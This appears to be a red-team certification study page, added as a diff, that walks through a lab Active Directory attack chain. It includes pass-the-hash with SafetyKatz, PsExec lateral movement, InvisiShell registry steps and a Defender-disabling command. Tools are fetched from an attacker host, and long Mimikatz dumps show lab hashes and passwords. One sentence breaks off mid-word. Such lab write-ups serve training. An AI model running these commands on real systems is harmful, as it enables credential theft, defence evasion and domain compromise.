@@ -1,0 +1,798 @@
+---
+layout: docs
+title: Phase 5 - Section 8
+---
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Phase 5 - Section 8 - CRTM - Mr Stark Study Notes</title>
+  <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtm-sidebar { padding: 20px; }
+    .crtm-sidebar h3 { color: #70ffdb; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtm-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #70ffdb; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtm-sidebar .portfolio-link:hover { 
+      background: #70ffdb; 
+      color: #1a1a1a; 
+    }
+    .crtm-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtm-sidebar a:hover { background: #2a2a2a; color: #70ffdb; }
+    .crtm-sidebar a.active { background: #70ffdb; color: #1a1a1a; font-weight: 600; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1, .notion-content h2, .notion-content h3 { color: #fafafa; margin: 20px 0 10px; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #70ffdb; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #70ffdb; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content pre code { background: transparent; padding: 0; }
+    .notion-content a { color: #70ffdb; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+    .notion-content figure { margin: 20px 0; text-align: center; }
+    .course-navigation { display: flex; justify-content: space-between; margin-top: 40px; padding-top: 20px; border-top: 1px solid #2a2a2a; }
+    .prev-part, .next-part { display: inline-block; padding: 12px 20px; background: #2a2a2a; color: #70ffdb; text-decoration: none; border-radius: 6px; transition: all 0.2s; }
+    .prev-part:hover, .next-part:hover { background: #70ffdb; color: #1a1a1a; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTM Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtm-sidebar">
+          <a href="../../" class="portfolio-link">← Portfolio</a>
+          <h3>Phases</h3>
+          <a href="overview.html">Overview</a>
+
+          <a href="part-01-phase-1-sections-1-2.html">Phase 1 - Sections 1/2</a>
+          <a href="part-02-phase-2-sections-3-4-5.html">Phase 2 - Sections 3/4/5</a>
+          <a href="part-03-phase-3-sections-3-6.html">Phase 3 - Sections 3/6</a>
+          <a href="part-04-phase-4-section-7.html">Phase 4 - Section 7</a>
+          <a href="part-05-phase-5-section-8.html" class="active">Phase 5 - Section 8</a>
+          <a href="part-06-phase-6-section-9.html">Phase 6 - Section 9</a>
+          <a href="part-07-phase-7-section-10.html">Phase 7 - Section 10</a>
+          <a href="part-08-phase-8-sections-11-12.html">Phase 8 - Sections 11/12</a>
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Back</p>
+              <a href="../../../" class="contact-link">Portfolio</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Phase 5 - Section 8</header>
+        <section class="about-text notion-content">
+<figure><img src="../../assets/crtm/04-Section8.png" alt="Phase 5 Attack Path"></figure>
+
+<p>In Path 5, Section 8, our objective is to achieve Domain Admin privileges on the <code>gcbsec.local</code> domain by executing a multi-step privilege escalation chain. We begin on <code>IT-TRACK01</code>, where we extract credentials through a memory dump. These credentials allow us to gain local administrator access on <code>SEC-SYSLOG01</code>. Once on <code>SEC-SYSLOG01</code>, we locate and extract higher-privileged credentials, specifically Domain Admin-level, which are then used to compromise the domain controller <code>SEC-DC</code>.</p>
+
+<p>During this process, we will likely have to bypass various Windows Defender protections including Application Control, ASR (Attack Surface Reduction), and Credential Guard/LSASS protections (CLM). The end goal is to extract valid credentials and replay them to escalate our privileges within the <code>gcbsec.local</code> domain, concluding with full Domain Admin access.</p>
+
+<p>If we remember from our credentials dumping on our own attacking workstations (itemployee41$), when dumped the Vault  credentials, we used the first credential to get local domain admin on IT-PREPROD MySQL DataBase, but we never used the second credential at all. As we are able to see the 2 credential seems to be promising and we will use this second credential to login into the web service Redmine running on <code><strong>IT-PREPROD</strong></code>.</p>
+
+<details>
+<summary><strong>ITEmployee41 LSASS Dumps - Vault::list</strong></summary>
+<pre><code class="language-Bash">
+          1.    Internet Explorer
+                Type            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
+                LastWritten     : 5/16/2024 5:39:33 AM
+                Flags           : 00000400
+                Ressource       : [STRING] http://192.168.4.111/
+                Identity        : [STRING] itemployees
+                Authenticator   :
+                PackageSid      :
+                *Authenticator* : [STRING] ReadOnlyAccess</code></pre>
+</details>
+
+<p>back to IT-PREPROD server, we need to use those credentials on Redmine running on it.</p>
+
+<figure><img src="../../assets/crtm/image 205.png" alt="Redmine Login"></figure>
+
+<p>While surfing around the application, we will find out that there is a project name Investigations.</p>
+
+<figure><img src="../../assets/crtm/image 206.png" alt="Investigations Project"></figure>
+
+<figure><img src="../../assets/crtm/image 207.png" alt="BUG#2 Details"></figure>
+
+<p>While checking this project it is possible to find that on BUG#2, the administrator updated the description saying that he was working on a new tools to be able to extract secrets from LSASS, he also uploaded a dump named lsass_mem.dmp. After downloading it into our attacking host, let us use SafetyKatz.exe to request for all the LSASS credentials on the lsass_mem.dmp file.</p>
+
+<p>We encountered a persistent issue when attempting to extract credentials from the <code>lsass_mem.dmp</code> file using both Mimikatz and SafetyKatz. Despite loading th</p>
+
+<p>In summary, the failure with Mimikatz and SafetyKatz was due to their reliance on decrypted LSA structures, which were inaccessible in this dump. <code>pypykatz</code>, being less dependent on key imports and more flexible in its parsing strategy, succeeded where the others failed.</p>
+
+<p>During the domain trust enumeration, I was not able to find a relationship between it.gcb.local and gcbsec.local and you can see below.<br>
+I used PowerView module for this enumeration.</p>
+
+<p><code>Get-DomainTrust</code></p>
+
+<figure><img src="../../assets/crtm/image 210.png" alt="Domain Trust Enumeration"></figure>
+
+<h1>PortScan</h1>
+
+<p>Because the previous enumeration did not point to the valid domain we were supposed to move to, we should then look for another direction and this was the port scan on network <code>192.168.144.0/24</code>.<br>
+In a Windows-based environment where ICMP echo requests (ping) are typically blocked by Windows Defender Firewall, the classic <code>nmap -sn</code> ping scan becomes ineffective. To bypass that and reliably discover live hosts, especially during internal assessments where we are scanning from within the network (e.g., lateral movement scenarios), the best approach is to rely on <strong>TCP-based host discovery</strong>.</p>
+
+<p><code>nmap -n -Pn -p 445,135,139,3389,5985 --open 192.168.144.0/24</code></p>
+
+<figure><img src="../../assets/crtm/image 211.png" alt="Nmap Port Scan"></figure>
+
+<h3>Why this works:</h3>
+
+<ul>
+<li><code>n</code> - disables DNS resolution, speeds things up, and avoids noise.</li>
+<li><code>Pn</code> - tells Nmap not to ping - it treats all hosts as online and probes them directly.</li>
+</ul>
+
+<p>We initially attempt to elevate privileges to the <code>admin</code> user on the <code>secsyslog</code> domain using Rubeus with the <code>/asktgt</code> technique. Despite supplying the correct RC4 hash and specifying the domain, this approach failed with a <code>KRB-ERROR (68): KDC_ERR_WRONG_REALM</code>. This error clearly indicated that the domain controller we were communicating with<code>192.168.4.2</code>, belonging to <code>it.gcb.local</code>was not authoritative for the <code>secsyslog</code> domain. In other words, we were sending our Kerberos ticket request to the wrong realm. Although the hash and user information were valid, Kerberos cannot issue a TGT for a domain it doesn't own, which is why the authentication request was rejected.</p>
+
+<figure><img src="../../assets/crtm/image 213.png" alt="Rubeus asktgt Failure"></figure>
+
+<p><strong>Pass-the-Hash Token Injection (Local Impersonation via sekurlsa::pth) </strong></p>
+
+<p><strong>OR</strong></p>
+
+<p><strong>LSASS-based NTLM Session Forgery (No Kerberos)</strong></p>
+
+<p>After that failure, we pivoted to using <code>SafetyKatz</code> and executed a pass-the-hash attack with the <code>sekurlsa::pth</code> command. This method worked. It launched a PowerShell process where our identity was forged in-memory as <code>admin@secsyslog</code>, using the same NTLM hash. Unlike Kerberos, this technique doesn't involve reaching out to a domain controller for a TGT-it instead modifies the current process token and injects credentials locally. The OS treats that process as if it's running under the impersonated user. We confirmed the identity was assumed correctly, but noticed that no Kerberos tickets were available (<code>klist</code> showed an empty cache). That was expected because this method does not automatically request a TGT; it simply crafts a new logon session with the provided hash.</p>
+
+<p><code>SafetyKatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:SECSYSLOG /ntlm:fd9987e39827094aebac8233fefa519b /run:cmd" "exit"</code></p>
+
+<figure><img src="../../assets/crtm/image 214.png" alt="SafetyKatz PTH"></figure>
+
+<p>Next, we tried to move laterally to another host using PowerShell remoting via <code>Enter-PSSession</code> and <code>winrs</code>. Both methods failed with an error stating that the destination needed to be either in the <code>TrustedHosts</code> list or the connection needed to use HTTPS. Since we were targeting the host by its IP address and hadn't modified the WinRM client policy, our session despite being forged as a domain admin was rejected by the remote machine due to the lack of explicit trust or secure transport. This confirmed that the issue wasn't with the credentials, but with how WinRM handles authentication over IP in default configurations.</p>
+
+<h2>Deep Dive on the Problem</h2>
+
+<p>The technique that worked using SafetyKatz specifically the <code>sekurlsa::pth</code> command, is a local <strong>process-level token injection</strong> that enables us to impersonate a user by crafting a fake logon session directly within LSASS using only an NTLM hash. Rubeus, on the other hand, operates primarily through <strong>Kerberos ticket requests</strong> and manipulations. So no, Rubeus cannot do exactly what <code>SafetyKatz</code> (or Mimikatz) does with <code>sekurlsa::pth</code>. The two tools are solving related, but fundamentally different problems.</p>
+
+<p>That said, Rubeus <strong>does</strong> offer an equivalent outcome <em>under the right conditions</em>, but only if we can obtain a TGT. With that TGT, we can either:</p>
+
+<ul>
+<li></li>
+</ul>
+
+<p>Finally, we turned to <code>PsExec</code>, passing the same target IP and launching PowerShell interactively. This succeeded immediately. The reason is simple: PsExec does not rely on WinRM or Kerberos. Instead, it uses SMB to copy a service executable to the target, executes it under <code>NT AUTHORITY\SYSTEM</code>, and tunnels the I/O back to our machine. Because our current process was already impersonating <code>admin@secsyslog</code>, and that account had administrative rights on the target, PsExec executed flawlessly and gave us a shell as <code>NT AUTHORITY\SYSTEM</code>.</p>
+
+<p>In the end, the difference came down to protocol behavior. Kerberos-based authentication via Rubeus failed due to a realm mismatch, and WinRM-based remoting was blocked by host trust restrictions. Meanwhile, the pass-the-hash via SafetyKatz created a valid local identity, and PsExec leveraged that identity using SMB, bypassing the need for ticket-based authentication altogether.</p>
+
+<p><code>.\PsExec64.exe \\192.168.144.197 -i -s cmd</code></p>
+
+<figure><img src="../../assets/crtm/image 215.png" alt="PsExec to SEC-SYSLOG01"></figure>
+
+<h3>InvisiShell</h3>
+
+<p>Let's use InvisiShell to bypass PowerShell defense mechanisms and also disabled Defender right after.</p>
+
+<pre><code>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+
+REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
+REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
+REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InShellProf.dll" /f
+
+powershell
+
+set COR_ENABLE_PROFILING=
+set COR_PROFILER=
+REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f</code></pre>
+
+<h3>Disable Defender</h3>
+
+<p>Since we have local admin remote access to that machine, let's now disable firewall and dump the credentials.</p>
+
+<pre><code>Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableIntrusionPreventionSystem 1; Set-MpPreference -DisableNetworkProtection 1; Set-MpPreference -SubmitSamplesConsent 2; Set-MpPreference -MAPSReporting 0; Set-MpPreference -PUAProtection 0</code></pre>
+
+<h3>Import SafetyKatz on the target</h3>
+
+<p><code>Invoke-WebRequest -Uri http://192.168.100.41:443/SafetyKazt.exe -OutFile "C:\SafetyKatz.exe" -UseBasicParsing</code></p>
+
+<p>We encountered a persistent issue when attempting to extract credentials from LSASS using <code>SafetyKatz</code> and Mimikatz version 2.2.0. Despite having full administrative rights and even running as <code>NT AUTHORITY\SYSTEM</code>, every attempt to execute the <code>sekurlsa::logonpasswords</code> command resulted in the error below.</p>
+
+<p><code>ERROR kuhl_m_sekurlsa_acquireLSA ; Key import</code></p>
+
+<figure><img src="../../assets/crtm/image 216.png" alt="Mimikatz Key Import Error"></figure>
+
+<p>This error typically points to a failure in acquiring or interpreting the crypto material within LSASS memory. Given our privilege level and proper command syntax, initial assumptions about incorrect permissions or execution context were ruled out. We confirmed the issue persisted across both PowerShell and CMD environments, and that it was not related to clipboard injection or character mangling.</p>
+
+<p>After further investigation and validation, we discovered that this issue was caused by the version of Mimikatz/SaftyKatz being used. Mimikatz 2.2.0, while more recent, introduced changes in how it accesses and interprets LSASS memory structures. These changes, while designed for compatibility with modern Windows builds, are known to break support in specific scenarios particularly in environments where LSASS protection mechanisms (e.g., RunAsPPL) or security mitigations cause offset mismatch</p>
+
+<details>
+<summary><strong>Mimikatz 2.1.1 - sekurlsa::logonpasswords</strong></summary>
+<pre><code>mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 2303680 (00000000:002326c0)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 8:28:29 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+          * Username : SEC-SYSLOG01$
+          * Domain   : SEC
+          * NTLM     : 24413f97e44cd86bfe2e7693d85be7e6
+          * SHA1     : 6eb5f022a4f637ee790945d58410a22203e9a7e1
+        tspkg :
+        wdigest :
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : SEC-SYSLOG01$
+         * Domain   : gcbsec.local
+         * Password : %Z3@gGD=%@.fu?xSI71?'13U`9LOSgwrsVLR3\f"ZDa1rO'pm)\8"%>uA!.qbr3;BLT5t%K*.PbVfI.S"Tdj2Y&^B#>su`'p[A$K\U<?:sDu)wyZ0KrqUI
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 75029 (00000000:00012515)
+Session           : Service from 0
+User Name         : syslogagent
+Domain            : SEC
+Logon Server      : SEC-DC
+Logon Time        : 2/15/2024 3:53:29 AM
+SID               : S-1-5-21-4056425676-3036975250-1243519898-1105
+        msv :
+         [00000003] Primary
+          * Username : syslogagent
+          * Domain   : SEC
+          * NTLM     : 58a478135a93ac3bf058a5ea0e8fdb71
+          * SHA1     : 0d7d930ac3b1322c8a1142f9b22169d4eef9e855
+          * DPAPI    : d60699429f9f948597f90693f346eaf2
+        tspkg :
+        wdigest :
+         * Username : syslogagent
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : syslogagent
+         * Domain   : GCBSEC.LOCAL
+         * Password : Password123
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : SEC-SYSLOG01$
+Domain            : SEC
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+          * Username : SEC-SYSLOG01$
+          * Domain   : SEC
+          * NTLM     : 24413f97e44cd86bfe2e7693d85be7e6
+          * SHA1     : 6eb5f022a4f637ee790945d58410a22203e9a7e1
+        tspkg :
+        wdigest :
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : sec-syslog01$
+         * Domain   : GCBSEC.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 23187 (00000000:00005a93)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:19 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+          * Username : SEC-SYSLOG01$
+          * Domain   : SEC
+          * NTLM     : 24413f97e44cd86bfe2e7693d85be7e6
+          * SHA1     : 6eb5f022a4f637ee790945d58410a22203e9a7e1
+        tspkg :
+        wdigest :
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : SEC-SYSLOG01$
+         * Domain   : gcbsec.local
+         * Password : %Z3@gGD=%@.fu?xSI71?'13U`9LOSgwrsVLR3\f"ZDa1rO'pm)\8"%>uA!.qbr3;BLT5t%K*.PbVfI.S"Tdj2Y&^B#>su`'p[A$K\U<?:sDu)wyZ0KrqUI
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 23169 (00000000:00005a81)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:19 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+          * Username : SEC-SYSLOG01$
+          * Domain   : SEC
+          * NTLM     : 24413f97e44cd86bfe2e7693d85be7e6
+          * SHA1     : 6eb5f022a4f637ee790945d58410a22203e9a7e1
+        tspkg :
+        wdigest :
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : SEC-SYSLOG01$
+         * Domain   : gcbsec.local
+         * Password : %Z3@gGD=%@.fu?xSI71?'13U`9LOSgwrsVLR3\f"ZDa1rO'pm)\8"%>uA!.qbr3;BLT5t%K*.PbVfI.S"Tdj2Y&^B#>su`'p[A$K\U<?:sDu)wyZ0KrqUI
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 21926 (00000000:000055a6)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:18 AM
+SID               :
+        msv :
+         [00000003] Primary
+          * Username : SEC-SYSLOG01$
+          * Domain   : SEC
+          * NTLM     : 24413f97e44cd86bfe2e7693d85be7e6
+          * SHA1     : 6eb5f022a4f637ee790945d58410a22203e9a7e1
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 2344635 (00000000:0023c6bb)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : SEC-SYSLOG01
+Logon Server      : SEC-SYSLOG01
+Logon Time        : 2/15/2024 8:30:29 AM
+SID               : S-1-5-21-2886985321-2087241558-4159712032-500
+        msv :
+         [00000003] Primary
+          * Username : Administrator
+          * Domain   : SEC-SYSLOG01
+          * NTLM     : 5b184274dcba7bfd289e8a4f439676a4
+          * SHA1     : 42a44d0a532bf5d4f957bd2ec1786dabbf11c45a
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : SEC-SYSLOG01
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : SEC-SYSLOG01
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:21 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SEC-SYSLOG01$
+Domain            : SEC
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:18 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : sec-syslog01$
+         * Domain   : GCBSEC.LOCAL
+         * Password : (null)
+        ssp :
+        credman :</code></pre>
+</details>
+
+<p><code>.\mimikatz_old.exe "privilege::debug" "sekurlsa::ekeys" "exit"</code></p>
+
+<figure><img src="../../assets/crtm/image 218.png" alt="Mimikatz Ekeys"></figure>
+
+<details>
+<summary><strong>sekurlsa::ekeys</strong></summary>
+<pre><code>.\mimikatz_old.exe "privilege::debug" "sekurlsa::ekeys" "exit"
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::ekeys
+
+Authentication Id : 0 ; 2303680 (00000000:002326c0)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 8:28:29 AM
+SID               : S-1-5-96-0-2
+
+         * Username : SEC-SYSLOG01$
+         * Domain   : gcbsec.local
+         * Password : %Z3@gGD=%@.fu?xSI71?'13U`9LOSgwrsVLR3\f"ZDa1rO'pm)\8"%>uA!.qbr3;BLT5t%K*.PbVfI.S"Tdj2Y&^B#>su`'p[A$K\U<?:sDu)wyZ0KrqUI
+         * Key List :
+           aes256_hmac       52c8f462668554f9020e4abdf498c5212908e29d6ce3d52985512f4981efa1cb
+           aes128_hmac       0aa00043d0b13b9a4b45bf8591c530ca
+           rc4_hmac_nt       24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_old      24413f97e44cd86bfe2e7693d85be7e6
+           rc4_md4           24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_nt_exp   24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_old_exp  24413f97e44cd86bfe2e7693d85be7e6
+
+Authentication Id : 0 ; 75029 (00000000:00012515)
+Session           : Service from 0
+User Name         : syslogagent
+Domain            : SEC
+Logon Server      : SEC-DC
+Logon Time        : 2/15/2024 3:53:29 AM
+SID               : S-1-5-21-4056425676-3036975250-1243519898-1105
+
+         * Username : syslogagent
+         * Domain   : GCBSEC.LOCAL
+         * Password : Password123
+         * Key List :
+           aes256_hmac       0a201e463878efc53674319fdcf96b66e7108fa4b3c01972883f86050168951e
+           aes128_hmac       bc09df713f507660234ec674378fe5b4
+           rc4_hmac_nt       58a478135a93ac3bf058a5ea0e8fdb71
+           rc4_hmac_old      58a478135a93ac3bf058a5ea0e8fdb71
+           rc4_md4           58a478135a93ac3bf058a5ea0e8fdb71
+           rc4_hmac_nt_exp   58a478135a93ac3bf058a5ea0e8fdb71
+           rc4_hmac_old_exp  58a478135a93ac3bf058a5ea0e8fdb71
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : SEC-SYSLOG01$
+Domain            : SEC
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-20
+
+         * Username : sec-syslog01$
+         * Domain   : GCBSEC.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       07bcf641fce570c892975ef6c82a78d2ea814075aa521de69caac817da9a0c0f
+           rc4_hmac_nt       24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_old      24413f97e44cd86bfe2e7693d85be7e6
+           rc4_md4           24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_nt_exp   24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_old_exp  24413f97e44cd86bfe2e7693d85be7e6
+
+Authentication Id : 0 ; 23187 (00000000:00005a93)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:19 AM
+SID               : S-1-5-96-0-0
+
+         * Username : SEC-SYSLOG01$
+         * Domain   : gcbsec.local
+         * Password : %Z3@gGD=%@.fu?xSI71?'13U`9LOSgwrsVLR3\f"ZDa1rO'pm)\8"%>uA!.qbr3;BLT5t%K*.PbVfI.S"Tdj2Y&^B#>su`'p[A$K\U<?:sDu)wyZ0KrqUI
+         * Key List :
+           aes256_hmac       52c8f462668554f9020e4abdf498c5212908e29d6ce3d52985512f4981efa1cb
+           aes128_hmac       0aa00043d0b13b9a4b45bf8591c530ca
+           rc4_hmac_nt       24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_old      24413f97e44cd86bfe2e7693d85be7e6
+           rc4_md4           24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_nt_exp   24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_old_exp  24413f97e44cd86bfe2e7693d85be7e6
+
+Authentication Id : 0 ; 23169 (00000000:00005a81)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:19 AM
+SID               : S-1-5-96-0-1
+
+         * Username : SEC-SYSLOG01$
+         * Domain   : gcbsec.local
+         * Password : %Z3@gGD=%@.fu?xSI71?'13U`9LOSgwrsVLR3\f"ZDa1rO'pm)\8"%>uA!.qbr3;BLT5t%K*.PbVfI.S"Tdj2Y&^B#>su`'p[A$K\U<?:sDu)wyZ0KrqUI
+         * Key List :
+           aes256_hmac       52c8f462668554f9020e4abdf498c5212908e29d6ce3d52985512f4981efa1cb
+           aes128_hmac       0aa00043d0b13b9a4b45bf8591c530ca
+           rc4_hmac_nt       24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_old      24413f97e44cd86bfe2e7693d85be7e6
+           rc4_md4           24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_nt_exp   24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_old_exp  24413f97e44cd86bfe2e7693d85be7e6
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SEC-SYSLOG01$
+Domain            : SEC
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:18 AM
+SID               : S-1-5-18
+
+         * Username : sec-syslog01$
+         * Domain   : GCBSEC.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       07bcf641fce570c892975ef6c82a78d2ea814075aa521de69caac817da9a0c0f
+           rc4_hmac_nt       24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_old      24413f97e44cd86bfe2e7693d85be7e6
+           rc4_md4           24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_nt_exp   24413f97e44cd86bfe2e7693d85be7e6
+           rc4_hmac_old_exp  24413f97e44cd86bfe2e7693d85be7e6
+
+mimikatz(commandline) # exit</code></pre>
+</details>
+
+<p><code>.\PsExec.exe \\192.168.144.197 -accepteula -u "sec\syslogagent" -p "Password123"  cmd</code></p>
+
+<figure><img src="../../assets/crtm/image 219.png" alt="PsExec with syslogagent"></figure>
+
+<p><code>Invoke-WebRequest -Uri http://192.168.100.41:443/ADModule-master.zip -OutFile "C:\ADModule-master.zip" -UseBasicParsing</code></p>
+
+<p><code>Expand-Archive -Path "C:\ADModule-master.zip" -DestinationPath "C:\"</code></p>
+
+<p><code>Get-ADUser -Filter * | Select-Object -ExpandProperty 'Name'</code></p>
+
+<figure><img src="../../assets/crtm/image 220.png" alt="Get-ADUser"></figure>
+
+<p><code>Get-ADComputer -Filter * | Select-Object -ExpandProperty 'Name'</code></p>
+
+<figure><img src="../../assets/crtm/image 221.png" alt="Get-ADComputer"></figure>
+
+<p><code>ipconfig /all</code></p>
+
+<figure><img src="../../assets/crtm/image 222.png" alt="IPConfig All"></figure>
+
+<p>We confirmed that we are operating under the <code>sec\syslogagent</code> user account. This account is not only a member of the local Administrators group, but also belongs to the highly privileged <strong>Enterprise Admins</strong> group in the Active Directory domain. Despite not being part of the <strong>Domain Admins</strong> group, being an Enterprise Admin grants this user equivalent or greater privileges across the forest, allowing for administration of any domain within it. This has significant implications for lateral movement, domain-wide privilege escalation, and trust exploitation.</p>
+
+<p><code>Get-ADDomainController</code></p>
+
+<figure><img src="../../assets/crtm/image 223.png" alt="Get-ADDomainController"></figure>
+
+<p>The enumeration output from <code>Get-ADDomainController</code> confirms the domain controller's identity, role, and configuration details for the <code>gcbsec.local</code> domain.</p>
+
